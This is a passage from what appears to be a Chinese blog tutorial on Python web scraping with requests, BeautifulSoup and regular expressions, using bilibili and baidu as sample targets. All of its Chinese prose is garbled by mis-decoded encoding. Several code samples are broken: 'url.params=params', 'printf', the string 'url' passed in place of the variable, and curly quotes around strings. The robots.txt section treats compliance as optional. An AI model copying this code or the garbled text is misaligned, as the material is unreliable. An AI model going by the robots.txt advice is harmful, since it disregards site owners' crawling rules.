r.raise_for_status()    <span class="comment">#åˆ¤æ–­å¼‚å¸¸</span></span><br><span class="line">        </span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;äº§ç”Ÿå¼‚å¸¸&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url = <span class="string">&quot;https://search.bilibili.com/all?keyword=%E5%AE%AB%E6%9C%AC%E7%8B%97%E9%9B%A8&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(getHTMLText(url))</span><br></pre></td></tr></table></figure><h2 id="Requestsåº“æ–¹æ³•è¯¦è§£"><a href="#Requestsåº“æ–¹æ³•è¯¦è§£" class="headerlink" title="Requestsåº“æ–¹æ³•è¯¦è§£"></a>Requestsåº“æ–¹æ³•è¯¦è§£</h2><h3 id="é‡ä¸­ä¹‹é‡ï¼šrequests-request"><a href="#é‡ä¸­ä¹‹é‡ï¼šrequests-request" class="headerlink" title="é‡ä¸­ä¹‹é‡ï¼šrequests.request()"></a>é‡ä¸­ä¹‹é‡ï¼š<code>requests.request()</code></h3><p>åŸå‹ï¼š<code>requests.request(method,url,**kwargs)</code></p><ul><li><code>method</code>ï¼šå¯¹åº”httpåè®®ä¸­çš„ä¸ƒç§è¯·æ±‚æ–¹æ³•</li><li><code>url</code>ï¼šè¯·æ±‚çš„é“¾æ¥</li><li><code>**kwargs</code>ï¼šæ§åˆ¶è®¿é—®çš„å‚æ•°ï¼Œå…±13ä¸ª</li></ul><h3 id="requests-get"><a href="#requests-get" class="headerlink" title="requests.get()"></a><code>requests.get()</code></h3><p>åŸå‹ï¼š<code>requests.get(url,params=None,**kwargs)</code></p><ul><li><code>url</code>ï¼šè¯·æ±‚çš„é“¾æ¥</li><li><code>params</code>ï¼šurlä¸­çš„é¢å¤–å‚æ•°ï¼Œå­—å…¸æˆ–å­—èŠ‚æµæ ¼å¼ï¼Œå¯é€‰</li><li><code>**kwargs</code>ï¼šæ§åˆ¶è®¿é—®çš„å‚æ•°</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¼ å‚æ–¹æ³•ä¸€ï¼Œç›´æ¥åœ¨urlé‡Œé¢æ‹¼æ¥</span></span><br><span class="line">url = â€https://search.bilibili.com/<span class="built_in">all</span>?keyword=å®«æœ¬ç‹—é›¨â€œ</span><br><span class="line">r = requests.get(url)</span><br><span class="line"><span class="built_in">print</span>(r.url)</span><br><span class="line"><span class="comment"># ä¼ å‚æ–¹æ³•äºŒï¼Œå°†å‚æ•°ä¿å­˜ä¸ºå­—å…¸ï¼Œä¼ ç»™ params</span></span><br><span class="line">url = <span class="string">&quot;https://search.bilibili.com&quot;</span></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;all?keyword&quot;</span>:<span class="string">&quot;å®«æœ¬ç‹—é›¨&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url.params=params)</span><br><span class="line"><span class="built_in">print</span>(r.url)</span><br></pre></td></tr></table></figure><h3 id="requests-post"><a href="#requests-post" class="headerlink" title="requests.post()"></a><code>requests.post()</code></h3><p>åŸå‹ï¼š<code>requests.post(url,data=None,json=None,**kwargs)</code></p><ul><li><code>url</code>ï¼šè¯·æ±‚çš„é“¾æ¥</li><li><code>data</code>ï¼šè¯·æ±‚çš„å†…å®¹ï¼Œå¯ä»¥æ˜¯å­—å…¸ï¼Œå­—èŠ‚åºåˆ—æˆ–æ–‡ä»¶</li><li><code>json</code>ï¼šJSON æ ¼å¼æ•°æ®ï¼Œä¹Ÿæ˜¯è¯·æ±‚çš„å†…å®¹</li><li><code>**kwargs</code>ï¼šæ§åˆ¶è®¿é—®çš„å‚æ•°</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¼ å‚æ–¹æ³•ä¸€ï¼šç›´æ¥postå­—å…¸</span></span><br><span class="line">url = â€œhttps://www.baidu.comâ€</span><br><span class="line">payload = &#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;valus&quot;</span>&#125;</span><br><span class="line">r = requests.post(<span class="string">&#x27;url&#x27;</span>,data = payload)</span><br><span class="line">printf(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¼ å‚æ–¹æ³•äºŒï¼šdata = å­—ç¬¦ä¸²</span></span><br><span class="line">url = â€œhttps://www.baidu.comâ€</span><br><span class="line">r = requests.post(<span class="string">&#x27;url&#x27;</span>,data = â€˜ABCDEFGâ€™)</span><br><span class="line">printf(r.text)</span><br></pre></td></tr></table></figure><blockquote><p>data ç­‰äºä¸€ä¸ªå­—å…¸çš„æ—¶å€™ï¼Œç”¨æˆ·ä¼ è¾“çš„æ•°æ®ä¼šè¢«ç¼–ç åˆ° form è¡¨å•å½“ä¸­</p><p>è€Œ data ç›´æ¥ç­‰äºä¸€ä¸ªå­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œç”¨æˆ·ä¼ è¾“çš„æ•°æ®ä¼šè¢«ç¼–ç åˆ° data é‡Œé¢</p></blockquote><h2 id="13ä¸ªè®¿é—®æ§åˆ¶å‚æ•°"><a href="#13ä¸ªè®¿é—®æ§åˆ¶å‚æ•°" class="headerlink" title="13ä¸ªè®¿é—®æ§åˆ¶å‚æ•°"></a>13ä¸ªè®¿é—®æ§åˆ¶å‚æ•°</h2><h3 id="kwargsï¼šæ§åˆ¶è®¿é—®çš„å‚æ•°"><a href="#kwargsï¼šæ§åˆ¶è®¿é—®çš„å‚æ•°" class="headerlink" title="**kwargsï¼šæ§åˆ¶è®¿é—®çš„å‚æ•°"></a><code>**kwargs</code>ï¼šæ§åˆ¶è®¿é—®çš„å‚æ•°</h3><ul><li><code>params</code>ï¼šå­—å…¸æˆ–è€…å­—èŠ‚åºåˆ—ï¼Œä½œä¸ºå‚æ•°å¢åŠ åˆ° <code>url</code> ä¸­</li><li><code>data</code>ï¼šå­—å…¸ã€å­—èŠ‚åºåˆ—æˆ–æ–‡ä»¶å¯¹è±¡ï¼Œä½œä¸º <code>request</code> çš„å†…å®¹</li><li><code>json</code>ï¼š JSON æ ¼å¼çš„æ•°æ®ï¼Œä½œä¸º <code>request </code>çš„å†…å®¹</li><li><code>headers</code>ï¼šå­—å…¸ï¼ŒHTTPå®šåˆ¶å¤´</li><li><code>cookies</code>ï¼šå­—å…¸æˆ–è€… <code>cookiejar</code>ï¼Œä½œä¸º <code>request</code>ä¸­çš„ cookie</li><li><code>auth</code>ï¼šå…ƒç»„ï¼Œæ”¯æŒHTTPè®¤è¯åŠŸèƒ½</li><li><code>files</code>ï¼šå­—å…¸ç±»å‹ï¼Œä¼ è¾“æ–‡ä»¶</li><li><code>timeout</code>ï¼šè®¾å®šè¶…æ—¶æ—¶é—´ï¼Œç§’ä¸ºå•ä½ï¼Œè¶…æ—¶è¿”å›å¼‚å¸¸</li><li><code>proxies</code>ï¼šå­—å…¸ç±»å‹ï¼Œè®¾å®šè®¿é—®ä»£ç†æœåŠ¡å™¨çš„ ip åœ°å€ï¼Œå¯ä»¥å¢åŠ ç™»é™†è®¤è¯</li><li><code>allow_redirects</code>ï¼šTrue&#x2F;Falseï¼Œé»˜è®¤ä¸ºTrueï¼Œé‡å®šå‘å¼€å…³</li><li><code>stream</code>ï¼šTrue&#x2F;Falseï¼Œé»˜è®¤ä¸ºTrueï¼Œè·å–å†…å®¹ç«‹å³ä¸‹è½½å¼€å…³</li><li><code>verify</code>ï¼šTrue&#x2F;Falseï¼Œé»˜è®¤ä¸ºTrueï¼Œè®¤è¯ SSL è¯ä¹¦å¼€å…³</li><li><code>cert</code>ï¼šæœ¬åœ° SSL è¯ä¹¦è·¯å¾„</li></ul><h2 id="çˆ¬è™«è§„åˆ™"><a href="#çˆ¬è™«è§„åˆ™" class="headerlink" title="çˆ¬è™«è§„åˆ™"></a>çˆ¬è™«è§„åˆ™</h2><table><thead><tr><th align="center">çˆ¬ç½‘é¡µ</th><th align="center">çˆ¬ç½‘ç«™ã€ç³»åˆ—ç½‘ç«™</th><th align="center">çˆ¬å…¨ç½‘</th></tr></thead><tbody><tr><td align="center">å°è§„æ¨¡</td><td align="center">ä¸­è§„æ¨¡</td><td align="center">å¤§è§„æ¨¡</td></tr><tr><td align="center">çˆ¬å–é€Ÿåº¦ä¸æ•æ„Ÿ</td><td align="center">çˆ¬å–é€Ÿåº¦æ•æ„Ÿ</td><td align="center">çˆ¬å–é€Ÿåº¦å…³é”®</td></tr><tr><td align="center">Requestsåº“</td><td align="center">Scrapyåº“</td><td align="center">å®šåˆ¶åº“</td></tr></tbody></table><blockquote><p>ä¸è¦ä¹±çˆ¬ï¼Œä¹±çˆ¬å®¹æ˜“å‡ºäº‹ï¼Œä¸ç„¶å“ªå¤©å°±è¿›å»äº†</p></blockquote><h2 id="Robotsåè®®"><a href="#Robotsåè®®" class="headerlink" title="Robotsåè®®"></a>Robotsåè®®</h2><ul><li>ç½‘ç«™å‘ŠçŸ¥çˆ¬è™«å“ªäº›é¡µé¢å¯ä»¥çˆ¬ï¼Œå“ªäº›ä¸èƒ½çˆ¬ï¼Œéµä¸éµå®ˆçœ‹ä¸ªäºº</li><li>å¦‚æœç½‘ç«™æ ¹ç›®å½•ä¸‹æ²¡æœ‰<code>robots.txt</code>ï¼Œåˆ™è¡¨ç¤ºè¯¥ç½‘ç«™æ‰€æœ‰ä¸œè¥¿éƒ½å¯ä»¥çˆ¬</li><li><code>ç±»äººè¡Œä¸º</code>å¯ä¸å‚è€ƒ<code>Robotsåè®®</code>ï¼Œå› ä¸ºå…¶ä¸ä¼šå¯¹æœåŠ¡å™¨äº§ç”Ÿå¾ˆå¤§çš„å½±å“ï¼Œï¼Œä½†æ˜¯è·å–çš„ä¸œè¥¿ä¸èƒ½ç”¨äºå•†ä¸šç”¨é€”</li></ul><h1 id="ç½‘ç»œçˆ¬è™«ä¹‹æå–"><a href="#ç½‘ç»œçˆ¬è™«ä¹‹æå–" class="headerlink" title="ç½‘ç»œçˆ¬è™«ä¹‹æå–"></a>ç½‘ç»œçˆ¬è™«ä¹‹æå–</h1><h2 id="BeautifulSoupåº“"><a href="#BeautifulSoupåº“" class="headerlink" title="BeautifulSoupåº“"></a>BeautifulSoupåº“</h2><ul><li>ä¸€èˆ¬å¼•ç”¨ <code>bs4</code> åº“ä¸­çš„<code>BeautifulSoup</code>ç±»å°±å¤Ÿäº†</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(<span class="string">&quot;&lt;p&gt;python&lt;/p&gt;&quot;</span>,<span class="string">&quot;html.parser&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210106191203.png"></p><h3 id="åŸºæœ¬å…ƒç´ "><a href="#åŸºæœ¬å…ƒç´ " class="headerlink" title="åŸºæœ¬å…ƒç´ "></a>åŸºæœ¬å…ƒç´ </h3><ul><li>æ ‡ç­¾æ ‘å°±æ˜¯æ±¤ï¼Œ<code>BeautifulSoup</code>ç±»å°±æ˜¯å°†ä¸€ä¸ªæ ‡ç­¾æ ‘å˜æˆä¸€ä¸ªå˜é‡ï¼Œç”¨ç±»é‡Œé¢çš„æ–¹æ³•æ¥ç†¬æ±¤ï¼ˆè§£ææ ‡ç­¾æ ‘ï¼‰</li></ul><table><thead><tr><th align="center">åŸºæœ¬å…ƒç´ </th><th align="center">è§£é‡Š</th></tr></thead><tbody><tr><td align="center"><code>Tag</code></td><td align="center">æ ‡ç­¾ï¼Œæœ€åŸºæœ¬çš„ä¿¡æ¯ç»„ç»‡å•å…ƒï¼Œåˆ†åˆ«ç”¨&lt;&gt;å’Œ&lt;&#x2F;&gt;æ ‡æ˜å¼€å¤´å’Œç»“å°¾</td></tr><tr><td align="center"><code>Name</code></td><td align="center">æ ‡ç­¾çš„åå­—ï¼Œ&lt;p&gt;â€¦&lt;&#x2F;p&gt;çš„åå­—æ˜¯â€™pâ€™ï¼Œæ ¼å¼ï¼š&lt;tag&gt;.name</td></tr><tr><td align="center"><code>Attributes</code></td><td align="center">æ ‡ç­¾çš„å±æ€§ï¼Œå­—å…¸å½¢å¼ç»„ç»‡ï¼Œæ ¼å¼ï¼š&lt;tag&gt;.attrs</td></tr><tr><td align="center"><code>NavigableString</code></td><td align="center">æ ‡ç­¾å†…éå±æ€§å­—ç¬¦ä¸²ï¼Œ&lt;&gt;â€¦&lt;&#x2F;&gt;ä¸­å­—ç¬¦ä¸²ï¼Œæ ¼å¼ï¼š&lt;tag&gt;string</td></tr><tr><td align="center"><code>Comment</code></td><td align="center">æ ‡ç­¾å†…å­—ç¬¦ä¸²çš„æ³¨é‡Šéƒ¨åˆ†ï¼Œä¸€ç§ç‰¹æ®Šçš„Commentç±»å‹</td></tr></tbody></table><blockquote><p> å¦‚ä½•åˆ¤æ–­è§£æå‡ºæ¥çš„å­—ç¬¦ä¸²æ˜¯æ³¨é‡Šè¿˜æ˜¯éå±æ€§å­—ç¬¦ä¸²ï¼Ÿ</p><p>ç”¨<code>type</code>æ¥åˆ¤æ–­ï¼Œ<code>BeautifulSoup</code>ç±»ä¸­è¿™ä¸¤ä¸ªçš„ç±»å‹ä¸ä¸€æ ·</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210106190638.png"></p><h3 id="è§£æå™¨"><a href="#è§£æå™¨" class="headerlink" title="è§£æå™¨"></a>è§£æå™¨</h3><ul><li>ä¸€å…±æ”¯æŒå››ç§è§£æå™¨</li><li>å…¶ä¸­<code>xml</code>å’Œ<code>lxml</code>éœ€è¦é¢å¤–å®‰è£…<code>lxml</code>åº“ï¼Œ<code>html5lib</code>éœ€è¦é¢å¤–å®‰è£…<code>html5lib</code>åº“</li></ul><table><thead><tr><th align="center">è§£æå™¨</th><th align="center">ä½¿ç”¨æ–¹æ³•</th><th align="center">ä¾èµ–</th></tr></thead><tbody><tr><td align="center"><code>bs4</code>çš„HTMLè§£æå™¨</td><td align="center">BeautifulSoup(mk,â€™html.parserâ€™)</td><td align="center">å®‰è£…bs4åº“</td></tr><tr><td align="center"><code>lxml</code>çš„HTMLè§£æå™¨</td><td align="center">BeautifulSoup(mk,â€™lxmlâ€™)</td><td align="center">pip install lxml</td></tr><tr><td align="center"><code>xml</code>çš„XMLè§£æå™¨</td><td align="center">BeautifulSoup(mk,â€™xmlâ€™)</td><td align="center">pip install lxml</td></tr><tr><td align="center"><code>html5lib</code>çš„è§£æå™¨</td><td align="center">BeautifulSoup(mk,â€™html5libâ€™)</td><td align="center">pip install html5lib</td></tr></tbody></table><h2 id="åŸºäºbs4åº“çš„HTMLçš„å†…å®¹éå†æ–¹æ³•"><a href="#åŸºäºbs4åº“çš„HTMLçš„å†…å®¹éå†æ–¹æ³•" class="headerlink" title="åŸºäºbs4åº“çš„HTMLçš„å†…å®¹éå†æ–¹æ³•"></a>åŸºäºbs4åº“çš„HTMLçš„å†…å®¹éå†æ–¹æ³•</h2><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210107013158.png"></p><h3 id="ä¸Šè¡Œéå†"><a href="#ä¸Šè¡Œéå†" class="headerlink" title="ä¸Šè¡Œéå†"></a>ä¸Šè¡Œéå†</h3><table><thead><tr><th align="center">å±æ€§</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center"><code>.parent</code></td><td align="center">èŠ‚ç‚¹çš„çˆ¶äº²æ ‡ç­¾</td></tr><tr><td align="center"><code>.parents</code></td><td align="center">èŠ‚ç‚¹å…ˆè¾ˆæ ‡ç­¾çš„è¿­ä»£ç±»å‹ï¼Œç”¨äºå¾ªç¯éå†å…ˆè¾ˆèŠ‚ç‚¹</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> parent <span class="keyword">in</span> soup.a.parents:</span><br><span class="line">    <span class="keyword">if</span> parent <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(parent)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(parent.name)</span><br><span class="line">        </span><br><span class="line">p</span><br><span class="line">body</span><br><span class="line">html</span><br><span class="line">[document]</span><br></pre></td></tr></table></figure><h3 id="ä¸‹è¡Œéå†"><a href="#ä¸‹è¡Œéå†" class="headerlink" title="ä¸‹è¡Œéå†"></a>ä¸‹è¡Œéå†</h3><table><thead><tr><th align="center">å±æ€§</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center"><code>.contents</code></td><td align="center">å­èŠ‚ç‚¹çš„åˆ—è¡¨ï¼Œå°†&lt;tag&gt;çš„æ‰€æœ‰å„¿å­èŠ‚ç‚¹å­˜å…¥åˆ—è¡¨</td></tr><tr><td align="center"><code>.children</code></td><td align="center">å­èŠ‚ç‚¹çš„è¿­ä»£ç±»å‹ï¼Œä¸<code>.contents</code>ç±»ä¼¼ï¼Œç”¨äºå¾ªç¯éå†å„¿å­èŠ‚ç‚¹</td></tr><tr><td align="center"><code>.descendants</code></td><td align="center">å­å­™èŠ‚ç‚¹çš„è¿­ä»£ç±»å‹ï¼ŒåŒ…å«æ‰€æœ‰å­å­™èŠ‚ç‚¹ï¼Œç”¨äºå¾ªç¯éå†</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> child <span class="keyword">in</span> soup.body.children:</span><br><span class="line">    <span class="built_in">print</span>(child)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;p <span class="keyword">class</span>=<span class="string">&quot;title&quot;</span>&gt;&lt;b&gt;The demo python introduces several python courses.&lt;/b&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;p <span class="keyword">class</span>=<span class="string">&quot;course&quot;</span>&gt;Python <span class="keyword">is</span> a wonderful general-purpose programming language. You can learn Python <span class="keyword">from</span> novice to professional by tracking the following courses:</span><br><span class="line">&lt;a <span class="keyword">class</span>=<span class="string">&quot;py1&quot;</span> href=<span class="string">&quot;http://www.icourse163.org/course/BIT-268001&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;link1&quot;</span>&gt;Basic Python&lt;/a&gt; <span class="keyword">and</span> &lt;a <span class="keyword">class</span>=<span class="string">&quot;py2&quot;</span> href=<span class="string">&quot;http://www.icourse163.org/course/BIT-1001870001&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;link2&quot;</span>&gt;Advanced Python&lt;/a&gt;.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> child <span class="keyword">in</span> soup.body.descendants:</span><br><span class="line">    <span class="built_in">print</span>(child)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;p <span class="keyword">class</span>=<span class="string">&quot;title&quot;</span>&gt;&lt;b&gt;The demo python introduces several python courses.&lt;/b&gt;&lt;/p&gt;</span><br><span class="line">&lt;b&gt;The demo python introduces several python courses.&lt;/b&gt;</span><br><span class="line">The demo python introduces several python courses.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;p <span class="keyword">class</span>=<span class="string">&quot;course&quot;</span>&gt;Python <span class="keyword">is</span> a wonderful general-purpose programming language. You can learn Python <span class="keyword">from</span> novice to professional by tracking the following courses:</span><br><span class="line">&lt;a <span class="keyword">class</span>=<span class="string">&quot;py1&quot;</span> href=<span class="string">&quot;http://www.icourse163.org/course/BIT-268001&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;link1&quot;</span>&gt;Basic Python&lt;/a&gt; <span class="keyword">and</span> &lt;a <span class="keyword">class</span>=<span class="string">&quot;py2&quot;</span> href=<span class="string">&quot;http://www.icourse163.org/course/BIT-1001870001&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;link2&quot;</span>&gt;Advanced Python&lt;/a&gt;.&lt;/p&gt;</span><br><span class="line">Python <span class="keyword">is</span> a wonderful general-purpose programming language. You can learn Python <span class="keyword">from</span> novice to professional by tracking the following courses:</span><br><span class="line"></span><br><span class="line">&lt;a <span class="keyword">class</span>=<span class="string">&quot;py1&quot;</span> href=<span class="string">&quot;http://www.icourse163.org/course/BIT-268001&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;link1&quot;</span>&gt;Basic Python&lt;/a&gt;</span><br><span class="line">Basic Python</span><br><span class="line"> <span class="keyword">and</span> </span><br><span class="line">&lt;a <span class="keyword">class</span>=<span class="string">&quot;py2&quot;</span> href=<span class="string">&quot;http://www.icourse163.org/course/BIT-1001870001&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;link2&quot;</span>&gt;Advanced Python&lt;/a&gt;</span><br><span class="line">Advanced Python</span><br><span class="line">.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="å¹³è¡Œéå†"><a href="#å¹³è¡Œéå†" class="headerlink" title="å¹³è¡Œéå†"></a>å¹³è¡Œéå†</h3><table><thead><tr><th align="center">å±æ€§</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center"><code>.next_sibling</code></td><td align="center">è¿”å›æŒ‰ç…§HTMLæ–‡æœ¬é¡ºåºçš„ä¸‹ä¸€ä¸ªå¹³è¡ŒèŠ‚ç‚¹æ ‡ç­¾</td></tr><tr><td align="center"><code>.previous_sibling</code></td><td align="center">è¿”å›æŒ‰ç…§HTMLæ–‡æœ¬é¡ºåºçš„ä¸Šä¸€ä¸ªå¹³è¡ŒèŠ‚ç‚¹æ ‡ç­¾</td></tr><tr><td align="center"><code>.next_siblings</code></td><td align="center">è¿­ä»£ç±»å‹ï¼Œè¿”å›æŒ‰ç…§HTMLæ–‡æœ¬é¡ºåºçš„åç»­æ‰€æœ‰å¹³è¡ŒèŠ‚ç‚¹æ ‡ç­¾</td></tr><tr><td align="center"><code>.previous_siblings</code></td><td align="center">è¿­ä»£ç±»å‹ï¼Œè¿”å›æŒ‰ç…§HTMLæ–‡æœ¬é¡ºåºçš„å‰ç»­æ‰€æœ‰å¹³è¡ŒèŠ‚ç‚¹æ ‡ç­¾</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">soup.a</span><br><span class="line"></span><br><span class="line">&lt;a <span class="keyword">class</span>=<span class="string">&quot;py1&quot;</span> href=<span class="string">&quot;http://www.icourse163.org/course/BIT-268001&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;link1&quot;</span>&gt;Basic Python&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">soup.a.next_sibling</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; and &#x27;</span></span><br><span class="line"></span><br><span class="line">soup.a.next_sibling.next_sibling</span><br><span class="line"></span><br><span class="line">&lt;a <span class="keyword">class</span>=<span class="string">&quot;py2&quot;</span> href=<span class="string">&quot;http://www.icourse163.org/course/BIT-1001870001&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;link2&quot;</span>&gt;Advanced Python&lt;/a&gt;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> sibling <span class="keyword">in</span> soup.a.next_siblings: </span><br><span class="line"><span class="built_in">print</span>(sibling)</span><br><span class="line">    </span><br><span class="line"> <span class="keyword">and</span> </span><br><span class="line">&lt;a <span class="keyword">class</span>=<span class="string">&quot;py2&quot;</span> href=<span class="string">&quot;http://www.icourse163.org/course/BIT-1001870001&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;link2&quot;</span>&gt;Advanced Python&lt;/a&gt;</span><br><span class="line">.</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sibling <span class="keyword">in</span> soup.a.previous_siblings:</span><br><span class="line"><span class="built_in">print</span>(sibling)</span><br><span class="line">    </span><br><span class="line">Python <span class="keyword">is</span> a wonderful general-purpose programming language. You can learn Python <span class="keyword">from</span> novice to professional by tracking the following courses:</span><br></pre></td></tr></table></figure><h3 id="èŠ‚ç‚¹"><a href="#èŠ‚ç‚¹" class="headerlink" title="èŠ‚ç‚¹"></a>èŠ‚ç‚¹</h3><ul><li>ç»“ç‚¹ä¸ä»…ä»…æ˜¯å°–æ‹¬å· &lt;&gt; çš„æ ‡ç­¾ï¼Œè¿˜æœ‰ä¸€äº›å­—ç¬¦å†…å®¹ï¼Œæ¯”å¦‚<code>\n</code>æˆ–æ ‡ç­¾ä¸­æœªè¢«åŒ…è£¹çš„å­—ç¬¦ä¸²ï¼Œéƒ½æ˜¯èŠ‚ç‚¹</li></ul><h3 id="ç¾åŒ–ä¸ç¼–ç "><a href="#ç¾åŒ–ä¸ç¼–ç " class="headerlink" title="ç¾åŒ–ä¸ç¼–ç "></a>ç¾åŒ–ä¸ç¼–ç </h3><ul><li><code>prettify()</code>æ–¹æ³•ç”¨äºç¾åŒ–æ ‡ç­¾å†…å®¹æ’ç‰ˆï¼Œå…¶å®å°±æ˜¯åŠ <code>\n</code>æ¥æ¢è¡Œï¼Œè®©æ ‡ç­¾æ ‘æ˜¾ç¤ºæ›´åŠ ç¾è§‚</li><li><code>BeautifulSoup</code>åº“å¯¹æ‰€æœ‰ä¼ å…¥çš„HTMLæ–‡æ¡£å’Œå­—ç¬¦ä¸²éƒ½è§£ææˆ<code>UTF-8</code>ç¼–ç ï¼ŒPython3 é»˜è®¤ä¹Ÿæ˜¯<code>UTF-8</code>ç¼–ç ï¼ŒPython2 ä¸æ˜¯</li></ul><h2 id="ä¿¡æ¯ç»„ç»‡ä¸æå–"><a href="#ä¿¡æ¯ç»„ç»‡ä¸æå–" class="headerlink" title="ä¿¡æ¯ç»„ç»‡ä¸æå–"></a>ä¿¡æ¯ç»„ç»‡ä¸æå–</h2><h1 id="ç½‘ç»œçˆ¬è™«ä¹‹å®æˆ˜"><a href="#ç½‘ç»œçˆ¬è™«ä¹‹å®æˆ˜" class="headerlink" title="ç½‘ç»œçˆ¬è™«ä¹‹å®æˆ˜"></a>ç½‘ç»œçˆ¬è™«ä¹‹å®æˆ˜</h1><h2 id="Re-åº“å…¥é—¨"><a href="#Re-åº“å…¥é—¨" class="headerlink" title="Re åº“å…¥é—¨"></a>Re åº“å…¥é—¨</h2><h3 id="æ­£åˆ™è¡¨è¾¾å¼è¯­æ³•"><a href="#æ­£åˆ™è¡¨è¾¾å¼è¯­æ³•" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼è¯­æ³•"></a>æ­£åˆ™è¡¨è¾¾å¼è¯­æ³•</h3><ul><li>æ­£åˆ™è¡¨è¾¾å¼è¯­æ³•ç”±å­—ç¬¦å’Œæ“ä½œç¬¦ç»„æˆ</li></ul><table><thead><tr><th align="center">æ“ä½œç¬¦</th><th align="center">è¯´æ˜</th><th align="center">å®ä¾‹</th></tr></thead><tbody><tr><td align="center"><code>.</code></td><td align="center">è¡¨ç¤ºä»»ä½•å•ä¸ªå­—ç¬¦</td><td align="center"><strong>.</strong>* è¡¨ç¤ºä»»æ„å­—ç¬¦</td></tr><tr><td align="center"><code>[]</code></td><td align="center">å­—ç¬¦é›†ï¼Œå¯¹å•ä¸ªå­—ç¬¦ç»™å‡ºå–å€¼èŒƒå›´</td><td align="center"><strong>[abc]</strong> è¡¨ç¤ºaã€bã€cï¼Œ[a-z] 